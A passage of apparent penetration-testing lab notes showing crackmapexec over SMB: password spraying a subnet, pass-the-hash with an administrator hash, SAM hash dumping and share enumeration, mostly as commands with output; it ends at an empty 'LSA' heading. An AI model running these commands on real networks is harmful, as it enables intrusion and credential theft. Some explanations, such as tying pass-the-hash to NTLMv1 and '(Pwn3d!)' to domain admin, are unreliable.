We are going to use the `crackmapexec` tool to perform the attack using the SMB protocol. However, this can be done via other protocols as well.

```bash
$ crackmapexec --help                                                                                                                          
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose] {ssh,smb,winrm,ldap,ftp,mssql,rdp} ...

options:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {ssh,smb,winrm,ldap,ftp,mssql,rdp}
    ssh                 own stuff using SSH
    smb                 own stuff using SMB
    winrm               own stuff using WINRM
    ldap                own stuff using LDAP
    ftp                 own stuff using FTP
    mssql               own stuff using MSSQL
    rdp                 own stuff using RDP
```

## Pass the Password

Once we have compromised the credentials of one user, we can use them to sweep the network using it.

```bash
$ crackmapexec smb 192.168.23.0/24 -u fcastle -d MARVEL.local -p Password1                                                                
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
SMB         192.168.23.132  445    SPIDERMAN        [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
SMB         192.168.23.130  445    HYDRA-DC         [+] MARVEL.local\fcastle:Password1 
SMB         192.168.23.131  445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
```

From the `[+]` symbol, we can determine which accounts we were able to login to using the password. The `(Pwn3d!)` indicates which machines we were able to get domain admin in. 

## Pass the Hash

This attack only work with [[New Technology LAN Manager|NTLMv1]] hashes, not with v2. The command to perform the attack is the following.

```bash
$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
SMB         192.168.23.1    445    LENOVO-M75Q      [*] Windows 10.0 Build 26100 x64 (name:LENOVO-M75Q) (domain:LENOVO-M75Q) (signing:True) (SMBv1:False)
SMB         192.168.23.1    445    LENOVO-M75Q      [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
```

We see that we are successful in **compromising the local administrator** of the same two machines. This is a common scenario that can be seen in an enterprise network as well. 

The common thing to do when creating a network is for the SysAdmin to *use the same local administrator password in every single machine* in the network. Even this is a really strong password it does not matter since we do not need to crack is. Just passing it around works.

### SAM Dump

In addition to just logging in, we can dump the SAM using `crackmapexec` as well by specifying the `--sam` flag. In addition to dumping them, these will be **stored in a database** well.

```bash
$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam    
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.131  445    THEPUNISHER      [+] Dumping SAM hashes
SMB         192.168.23.132  445    SPIDERMAN        [+] Dumping SAM hashes
SMB         192.168.23.131  445    THEPUNISHER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.23.132  445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.23.131  445    THEPUNISHER      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.132  445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.132  445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.131  445    THEPUNISHER      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.23.131  445    THEPUNISHER      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b3add03b24d1f29c29382523ce27a652:::
SMB         192.168.23.132  445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06305620589538b1768e3850f55048d9:::
SMB         192.168.23.131  445    THEPUNISHER      frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.23.131  445    THEPUNISHER      [+] Added 5 SAM hashes to the database
SMB         192.168.23.132  445    SPIDERMAN        peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.23.132  445    SPIDERMAN        [+] Added 5 SAM hashes to the database
```

### Listing Shares

```bash
$ crackmapexec smb 192.168.23.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
SMB         192.168.23.130  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [*] Windows 10 / Server 2019 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
SMB         192.168.23.130  445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.23.132  445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.23.131  445    THEPUNISHER      [+] THEPUNISHER\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.132  445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.23.131  445    THEPUNISHER      [+] Enumerated shares
SMB         192.168.23.131  445    THEPUNISHER      Share           Permissions     Remark
SMB         192.168.23.131  445    THEPUNISHER      -----           -----------     ------
SMB         192.168.23.131  445    THEPUNISHER      ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.23.131  445    THEPUNISHER      C$              READ,WRITE      Default share
SMB         192.168.23.131  445    THEPUNISHER      IPC$            READ            Remote IPC
SMB         192.168.23.132  445    SPIDERMAN        [+] Enumerated shares
SMB         192.168.23.132  445    SPIDERMAN        Share           Permissions     Remark
SMB         192.168.23.132  445    SPIDERMAN        -----           -----------     ------
SMB         192.168.23.132  445    SPIDERMAN        ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.23.132  445    SPIDERMAN        C$              READ,WRITE      Default share
SMB         192.168.23.132  445    SPIDERMAN        IPC$            READ            Remote IPC
```

### LSA

